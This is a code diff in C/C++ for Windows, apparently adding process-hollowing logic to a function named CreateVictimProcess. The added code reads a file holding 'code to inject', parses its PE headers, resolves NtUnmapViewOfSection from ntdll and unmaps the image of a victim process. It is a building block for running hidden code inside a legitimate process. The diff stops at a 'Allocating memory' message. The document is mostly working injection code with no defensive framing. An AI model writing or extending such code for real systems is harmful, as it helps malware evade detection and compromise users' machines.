@@ -8,6 +8,8 @@
 
 typedef NTSTATUS(__stdcall* _NtQueryInformationProcess)(_In_ HANDLE, _In_ unsigned int, _Out_ PVOID, _In_ ULONG, _Out_ PULONG);
 
+typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)( HANDLE ProcessHandle, PVOID BaseAddress);
+
 typedef void (*PPEBLOCKROUTINE)(
     PVOID PebLock
     );
@@ -181,6 +183,46 @@ void CreateVictimProcess(char* pDestCmdLine, char* pSourceFile)
     PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
 
     PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
+
+    //File where our code to inject resides
+
+    HANDLE hSourceFile = CreateFileA(pSourceFile, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
+    if (hSourceFile == INVALID_HANDLE_VALUE)
+    {
+        printf("Error opening %s\r\n", pSourceFile);
+        return;
+    }
+
+    DWORD dwSize = GetFileSize(hSourceFile, 0);
+    PBYTE pBuffer = new BYTE[dwSize];
+    DWORD dwBytesToRead = 0;
+    ReadFile(hSourceFile, pBuffer, dwSize, &dwBytesToRead, 0);
+
+    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
+
+    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
+
+    printf("Unmapping destination section\r\n");
+
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+
+    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
+
+    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
+
+    DWORD dwResult = NtUnmapViewOfSection
+    (
+        pProcessInfo->hProcess,
+        pPEB->ImageBaseAddress
+    );
+
+    if (dwResult)
+    {
+        printf("Error unmapping section\r\n");
+        return;
+    }
+
+    printf("Allocating memory\r\n");
 }
 
 int main()
